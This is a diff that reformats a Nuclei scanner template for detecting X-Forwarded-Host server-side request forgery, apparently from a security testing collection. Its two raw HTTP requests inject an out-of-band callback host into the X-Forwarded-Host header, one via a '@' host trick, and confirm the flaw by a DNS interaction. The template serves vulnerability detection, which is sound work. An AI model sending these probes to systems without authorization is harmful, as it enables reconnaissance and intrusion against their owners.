@@ -1,30 +1,28 @@
 id: xfh-ssrf
+
 info:
-  author: shelled
   name: X-Forwarded-Host SSRF
-  reference:
-  - https://medium.com/@_yldrm/host-header-injection-to-complete-organization-takeover-67a8a2ddb188
-  - https://hackerone.com/reports/727330
+  author: shelled
   severity: medium
   tags: ssrf
+  reference:
+    - https://medium.com/@_yldrm/host-header-injection-to-complete-organization-takeover-67a8a2ddb188
+    - https://hackerone.com/reports/727330
+
 requests:
-- matchers:
-  - part: interactsh_protocol
-    type: word
-    words:
-    - dns
-  raw:
-  - 'GET / HTTP/1.1
-
-    Host: {{Hostname}}
-
-    X-Forwarded-Host: {{interactsh-url}}
-
-    '
-  - 'GET / HTTP/1.1
-
-    Host: {{Hostname}}
-
-    X-Forwarded-Host: {{Hostname}}@{{interactsh-url}}
-
-    '
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{Hostname}}@{{interactsh-url}}
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
